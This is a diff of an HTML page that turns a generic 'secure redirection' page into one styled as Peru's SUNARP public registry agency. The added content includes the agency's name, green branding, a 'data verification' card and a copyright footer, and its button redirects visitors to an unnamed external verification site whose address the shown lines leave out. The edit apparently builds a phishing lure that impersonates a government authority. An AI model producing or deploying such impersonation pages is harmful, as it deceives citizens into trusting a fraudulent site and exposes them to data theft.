@@ -2,34 +2,88 @@
 <html lang="es">
 <head>
   <meta charset="UTF-8">
-  <title>Redirección segura</title>
+  <title>Superintendencia Nacional de los Registros Públicos</title>
   <style>
     body {
-      font-family: Arial, sans-serif;
+      font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
+      background-color: #f4f4f4;
+      margin: 0;
+      padding: 0;
       text-align: center;
-      margin-top: 100px;
+    }
+
+    header {
+      background-color: #006633;
+      color: white;
+      padding: 20px 0;
+    }
+
+    header h1 {
+      margin: 0;
+      font-size: 24px;
+    }
+
+    .container {
+      margin-top: 80px;
+    }
+
+    .card {
+      background-color: white;
+      margin: 0 auto;
+      padding: 40px;
+      border-radius: 8px;
+      box-shadow: 0 4px 10px rgba(0,0,0,0.1);
+      max-width: 500px;
+    }
+
+    .card h2 {
+      color: #333;
+    }
+
+    .card p {
+      font-size: 16px;
+      color: #555;
+      margin-bottom: 30px;
     }
 
     button {
-      background-color: #007bff;
+      background-color: #006633;
       color: white;
       padding: 15px 30px;
-      font-size: 18px;
+      font-size: 16px;
       border: none;
-      border-radius: 8px;
+      border-radius: 6px;
       cursor: pointer;
     }
 
     button:hover {
-      background-color: #0056b3;
+      background-color: #004d26;
+    }
+
+    footer {
+      margin-top: 60px;
+      font-size: 12px;
+      color: #777;
     }
   </style>
 </head>
 <body>
-  <h2>Redirección a la página de verificación</h2>
-  <p>Haz clic en el botón para continuar.</p>
 
-  <button onclick="redirect()">Aceptar y continuar</button>
+  <header>
+    <h1>Superintendencia Nacional de los Registros Públicos</h1>
+  </header>
+
+  <div class="container">
+    <div class="card">
+      <h2>Verificación de datos</h2>
+      <p>Para continuar, haz clic en el siguiente botón. Serás redirigido a una página de verificación externa.</p>
+      <button onclick="redirect()">Aceptar y continuar</button>
+    </div>
+  </div>
+
+  <footer>
+    © SUNARP - República del Perú
+  </footer>
 
   <script>
     function redirect() {
@@ -39,5 +93,6 @@
       }, 1500);
     }
   </script>
+
 </body>
 </html>
